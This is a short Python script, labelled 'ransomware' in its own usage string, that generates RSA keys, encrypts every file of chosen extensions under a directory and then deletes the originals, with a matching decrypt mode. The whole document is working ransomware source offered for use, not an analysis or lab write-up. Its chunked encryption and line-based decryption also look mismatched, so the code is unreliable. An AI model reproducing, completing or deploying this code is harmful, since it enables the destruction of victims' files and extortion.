

import pyCryptoRSA
import os
import sys
import optparse



parser = optparse.OptionParser('Usage ransomware -m <mode> -p <directory> -l <extands list>')
parser.add_option('-m', dest='mode', type='string', help='must specify mode(generateKey | encrypt | decrypt)')
parser.add_option('-d', dest='dir', type='string', help='must specify directory')
parser.add_option('-l', dest='list', type='string', help='must specify extands list with comma(,)')


(option, args) = parser.parse_args()

if (option.mode == None) | (option.dir == None) | (option.list == None):
    if ((option.mode=="generateKey") & (option.dir != None)):
        pass
    elif (option.mode=="decrypt") & (option.dir != None):
        pass
    else:
        print(parser.usage)
        sys.exit(0)
    
mode = option.mode
dir = option.dir

if option.list:
    try:
        option.list.index(",")
        list = (option.list).split(",")
    except Exception as e:
        list = []
        list.append(option.list)
        


if (mode == "generateKey"):
    tempTuple=pyCryptoRSA.generate_RSA()
    
    f = open(dir + "\\pri.key", "w")
    f.write(tempTuple[0])
    f.close()
    
   
    f = open(dir + "\\pub.key", "w")
    f.write(tempTuple[1])
    f.close()
    
    print "complete gernerating keys"



if(mode == "encrypt"):

    pubKey = dir+"\\pub.key"
    print "read " + pubKey + "..."
    
 
    print "start encryption"
    for root, dirs, files in os.walk(dir):
        for file in files:
            
            try:
                list.index(file.split(".")[-1])
                pass
            except Exception as e:
                continue
            
            file = root + "\\" + file
            
          
            fileData = open(file, "rb")
            newFile = open(file+".en", "wb")
            while(True):
                content = fileData.read(200)
                if(content):
                    content = pyCryptoRSA.encrypt_RSA(pubKey, content)
                    newFile.writelines(content)
                else:
                    break
            fileData.close()
            newFile.close()
            
            
            os.unlink(file)
            print("\t[+]encrypted: " + file)
    
    print "complete encryption"
        
        


if(mode == "decrypt"):
    
    priKey = dir+"\\pri.key"  
    print "read " + priKey + "..."
    
 
    print "start decryption"
    for root, dirs, files in os.walk(dir):
        for file in files:
           
            if(file.split(".")[-1] != "en"):
                continue
    
            file = root + "\\" + file
    
            
            fileData = open(file, "rb")
            newFile = open(file[:-3], "wb")
            
            while(True):
                content = ""
                for i in range(0,5):
                    content += fileData.readline()
                print content
                
                if(content):
                    print content
                    newFile.writelines(pyCryptoRSA.decrypt_RSA(priKey, content))
                else:
                    break
            fileData.close()
            newFile.close()
            
            
            os.unlink(file)
            print("\t[+]decrypted: " + file[:-3])            
        
    print "complete decryption"
        
